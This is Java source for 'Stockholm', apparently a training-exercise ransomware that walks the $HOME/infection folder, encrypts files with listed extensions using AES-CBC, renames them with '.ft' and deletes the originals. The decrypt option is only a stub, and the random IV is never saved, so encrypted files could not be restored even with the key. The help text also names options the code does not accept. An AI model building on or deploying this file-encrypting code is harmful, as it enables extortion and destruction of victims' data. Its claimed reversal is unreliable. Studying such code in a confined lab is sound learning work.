package fr.lyyrst.stockholm;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.BufferedReader;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;

public class Stockholm {
    private final SecretKey key;

    Stockholm(String key) {
        this.key = createSecretKey(key);
    }

    public void manageArgs(String[] args) {
        switch (args[0]) {
            case "-h":
            case "-help":
                this.printHelp();
                break;
            case "-v":
            case "-version":
                this.printVersion();
                break;
            case "-s":
            case "-silent":
                this.encrypt(true);
                break;
            case "-r":
            case "-reverse":
                this.decrypt(args[1]);
                break;
            default:
                this.printUsage(args);
                System.exit(1);
        }
    }

    public void encrypt(Boolean silent) {
        Path infectionPath = Paths.get(System.getProperty("user.home"), "infection");

        if (!Files.exists(infectionPath) || !Files.isDirectory(infectionPath)) {
            System.out.println("error: $HOME/infection does not exist");
            System.exit(1);
        }
        System.out.println("Encrypting " + silent);

        byte[] ivBytes = new byte[16];
        SecureRandom secureRandom = new SecureRandom();
        secureRandom.nextBytes(ivBytes);
        IvParameterSpec ivParameterSpec = new IvParameterSpec(ivBytes);

        Set<String> allowedExtensions = readAllowedExtensions("AllowedExtensions.txt");

        try {
            Files.walk(infectionPath)
                    .filter(Files::isRegularFile)
                    .filter(file -> allowedExtensions.contains(getFileExtension(file)))
                    .forEach(file -> {
                        try {
                            encryptFile(file, ivParameterSpec, silent);
                        } catch (Exception e) {
                            System.err.println("Error encrypting file: " + file + " - " + e.getMessage());
                        }
                    });
        } catch (IOException e) {
            System.err.println("Error reading files in the directory: " + e.getMessage());
        }
    }

    public void decrypt(String key) {
        if (key.length() < 16) {
            this.printHelp();
            System.exit(1);
        }
        System.out.println("Decrypting with " + key);
    }

    private void encryptFile(Path file, IvParameterSpec iv, Boolean silent) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, this.key, iv);

        byte[] inputBytes = Files.readAllBytes(file);
        byte[] encryptedBytes = cipher.doFinal(inputBytes);
        Path encryptedFilePath;
        if (file.getFileName().toString().contains(".ft")) {
            encryptedFilePath = file;
        } else {
            encryptedFilePath = Paths.get(file.toString() + ".ft");
        }

        Files.write(encryptedFilePath, encryptedBytes);
        if (!file.equals(encryptedFilePath)) {
            Files.delete(file);
        }

        if (!silent) {
            System.out.println("Encrypted file: " + file + " -> " + encryptedFilePath);
        }
    }


    private String getFileExtension(Path file) {
        String fileName = file.getFileName().toString();
        int lastIndexOfDot = fileName.lastIndexOf('.');
        if (lastIndexOfDot > 0 && lastIndexOfDot < fileName.length() - 1) {
            return fileName.substring(lastIndexOfDot);
        }
        return "";
    }

    private Set<String> readAllowedExtensions(String filePath) {
        Set<String> extensions = new HashSet<>();
        try (BufferedReader reader = Files.newBufferedReader(Paths.get(filePath), StandardCharsets.UTF_8)) {
            String line;
            while ((line = reader.readLine()) != null) {
                extensions.add(line.trim());
            }
        } catch (IOException e) {
            e.printStackTrace();
            System.err.println("Error reading extensions from " + filePath + ": " + e.getMessage());
        }
        return extensions;
    }

    private SecretKey createSecretKey(String keyString) {
        MessageDigest digest = null;
        byte[] keyBytes;
        try {
            digest = MessageDigest.getInstance("SHA-256");
            keyBytes = digest.digest(keyString.getBytes(StandardCharsets.UTF_8));
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        }

        keyBytes = Arrays.copyOf(keyBytes, 16);

        return new SecretKeySpec(keyBytes, "AES");
    }

    public void printUsage(String[] badArgument) {
        System.out.println("Error: Invalid arguments: " + Arrays.toString(badArgument));
    }

    private void printVersion() {
        System.out.println("Stockholm 1.0");
    }

    private void printHelp() {
        System.out.println("""
                \
                This program is designed to manage files and includes several command-line options.
                
                Usage: java Stockholm [options]
                
                Available options:
                  -h, --help
                        Displays this help message and explains the program options.
                
                  -v, --version
                        Shows the current version of the program.
                
                  -r, --reverse <key>
                        Reverses the infection of a file using the specified key.
                        This option requires a "key" (16 long key minimum) argument immediately following it,\s
                        which represents the key to use for the reversal.
                
                  -s, --silent
                        Runs the program in silent mode. No output will be displayed during\s
                        the processing of files.
                       \s
                Example usage:
                  java ArgumentParser -r myKey -s
                        This command will reverse the infection using "myKey" and run in silent mode.
                """);
    }
}
